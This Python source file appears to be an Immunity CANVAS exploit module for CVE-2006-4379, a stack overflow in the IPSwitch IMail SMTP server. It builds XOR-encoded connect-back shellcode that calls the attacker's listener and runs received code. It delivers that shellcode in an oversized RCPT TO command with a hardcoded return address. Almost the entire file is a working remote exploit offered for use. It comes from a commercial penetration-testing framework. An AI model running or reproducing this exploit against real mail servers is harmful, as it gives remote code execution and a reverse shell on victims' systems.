#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2003
#http://www.immunityinc.com/CANVAS/ for more information


#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation

import sys
import time

if "." not in sys.path: sys.path.append(".")

from exploitutils import *
from encoder import addencoder as addencoder

from tcpexploit import tcpexploit
from shellcode import shellcodeGenerator
from win32Node import win32Node
import win32MosdefShellServer
import canvasengine
from socket import *
import smtplib

# GUI info
NAME="IMail SMTPD32 Stack Overflow"
DESCRIPTION="IMail SMTPD32 Stack Overflow"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="IPSwitch"
DOCUMENTATION["Date public"] = "2006-09-07"
DOCUMENTATION["CVE Name"] = "CVE-2006-4379"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-4379"
DOCUMENTATION['CVSS'] = 7.5
DOCUMENTATION["Platforms Tested"] = "Windows 2000 SP4 (English) IMail 8.13\n"
DOCUMENTATION["Post-exploitaion"]="Post-exploitation requires stoping and starting the IMail SMTP Server Service\n"+\
             "From a different process (use injectprocess to get a new listener) runcommand: net stop \"IMail SMTP Server\"\n"+\
             "net start \"IMail SMTP Server\""

VERSION="0.1"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2000" ]

GTK2_DIALOG="dialog.glade2"

NOTES = """
Tested on the following:
        
Windows 2000 SP4 up2date IMail 8.13

"""

CHANGELOG="""

"""

runAnExploit_gtk2 = canvasengine.runAnExploit_gtk2
runExploit = canvasengine.runExploit


class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.covertness = 0
        self.port = 25
        self.host = "10.10.10.7"
        self.localhost = "192.168.0.2"
        self.localport = 5555
        self.badstring = "\x00\r\n:<>@.\x20" #"\x00\r\n\\/.:$<>"
        self.name=NAME
        self.listenerArgsDict["fromcreatethread"] = 1
        return
    
    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]
    
    def xorEncode(self, shellcode, xorbyte):
        xorsc = "\xEB\x13\x5F\x8B\xF7\x33\xC9\x66\xB9" + struct.pack("<H", len(shellcode)) +\
                "\x80\x36" + struct.pack("<B", xorbyte) + "\x46\xE0\xFA\x8B\xCF\xEB\x05\xE8\xE8\xFF\xFF\xFF"
        
        xorshellcode = ""
        for each in shellcode:
            a = ord(each) ^ xorbyte
            xorshellcode += struct.pack("<B", a)

        sc = xorsc + xorshellcode
        
        for each in self.badstring:
            cnt = sc.count(each)
            if cnt != 0:
                #print "%.2x found %d many times" % (ord(each), cnt)
                return ""

        return sc
        
    def createShellcode(self):
        host=self.callback.ip
        port=self.callback.port
        self.localhost=host
        self.localport=port

        sc = shellcodeGenerator.win32()
        sc.addAttr("findeipnoesp",{"subespval": 0x1000 })
                
        #callback
        #sc.addAttr("revert_to_self_before_importing_ws2_32", None)   ws2_32 already loaded
        sc.addAttr("tcpconnect", {"port" : port, "ipaddress" : host})
        sc.addAttr("CreateThreadRecvExecWin32",{"socketreg": "FDSPOT"}) #MOSDEF
        sc.addAttr("ExitThread", None)
        #GOcode too big for now, use the ordinal code later
        #sc.addAttr("GOFindSock",None)
        #sc.addAttr("LoadRegAsFD", {"reg" : "esi"})
        #sc.addAttr("CreateThreadRecvExecWin32",{"socketreg": "FDSPOT"}) #MOSDEF
        #sc.addAttr("ExitThread", None)
                                                                                                                                                        
        rawshellcode = sc.get()
        """                                                                        
        self.log("Raw shellcode (before encoding) is %d byte"%len(rawshellcode))        
        encoder= addencoder.inteladdencoder()
        encoder.setbadstring(self.badstring)
        self.log( "Encoding shellcode. This may take a while if we don't find a good value in the cache.")
        shellcode=encoder.encode(rawshellcode)
        self.log( "Done encoding shellcode.")
        if shellcode=="":
            self.log( "Could not encode shellcode")
            raise "ErrorEncodingShellcode"
        """
        cnt = 0xff
        while cnt:
            shellcode = self.xorEncode(rawshellcode, cnt)
            if shellcode != "":
                break
            else:
                cnt -= 1
        
        if len(shellcode) == 0:
            raise Exception, "Could not encode shellcode!"
        """
        print "< %d" % shellcode.count("<")
        print "> %d" % shellcode.count(">")
        print "@ %d" % shellcode.count("@")
        print ": %d" % shellcode.count(":")
        print "\\r %d" % shellcode.count("\r")
        print "\\n %d" % shellcode.count("\n")
        print "NULL %d" % shellcode.count("\x00")
        
        for each in shellcode:
            print "%2.x " % ord(each),
        print "\n"
        """
        self.shellcode = shellcode
        self.log("length of real shellcode: %d"%(len(self.shellcode)))
        return self.shellcode
    
    def test(self):
        """
        8.13 vulnerable
        8.21 not vulnerable
        """
        return self.bannerchecktest({"IMail 8.13":1})
    
    def handleGoCode(self, sock):
        
        ret=self.checkTriggerWin32(sock)
        if not ret:
            #try twice
            ret=self.checkTriggerWin32(sock)
        if ret:
            self.log("Got trigger!")
            node=win32Node()
            node.parentnode=self.argsDict["passednodes"][0]
            newshell = win32MosdefShellServer.win32shellserver(sock,node,self.logfunction)
            node.startup()
            self.setInfo("%s attacking %s:%d - (succeeded!)" % (NAME, self.host, self.port), showlog=1)
            return node
        else:
            self.log("No trigger for win32...failed to call GOcode?")
            self.setInfo("%s attacking %s:%d - (failed!)" % (NAME, self.host, self.port), showlog=1)
            return 0

    def run(self):
        self.host=self.target.interface
        
        self.setInfo("%s attacking %s:%d - (in progress)"% (NAME, self.host, self.port), showlog=1)
        try:
            s= smtplib.SMTP(self.host, self.port)
        except:
            self.log("Could not connect to SMTP server")
            return 0
        s.sock.set_timeout(20)
        
        buf = "a"*(544 - len(self.shellcode))
        buf += self.shellcode

        self.setProgress(25)

        s.docmd("EHLO FOO\r\n")
        s.docmd("MAIL FROM <FOO@FOO>")
        #s.docmd("RCPT TO: <@\xb8\x8b\x15\x75:" + (544 * "\xcc") + "SSS" + ">")
        self.setProgress(50)
        #we need something like pop reg+ret for cross-platform!!!
        #some random test addie from samlib.dll
        #75158bb8: pop ebp
        #75158bb9: ret
        #msafd.dll!74fde994 seems to be same version on SP4 base and up2date
        addie = 0x74fde994L
        self.log("Using Address: %x"%addie)
        #alignment might change per version, lets hope not!
        ovf = "RCPT TO: <@" + struct.pack("<L", addie) + ":" + buf + "SSS" + ">"
        s.docmd(ovf)
        self.setProgress(75)
        #self.handleGoCode(s.sock)
        #print s.sock.recv(64000)
        s.sock.close()

        time.sleep(4)
        self.setProgress(100)
        
        if self.ISucceeded():
            self.setInfo("%s attacking %s:%d (succeeded!)"%(self.name,self.host,self.port), showlog=True)
            self.log("%s done (succeeded!)"%self.name)
            return 1
        
        self.setInfo("%s attacking %s:%d (failed)"%(self.name,self.host,self.port), showlog=True)
        self.log("%s done (failed)"%self.name)
        return 0
    
if __name__== '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
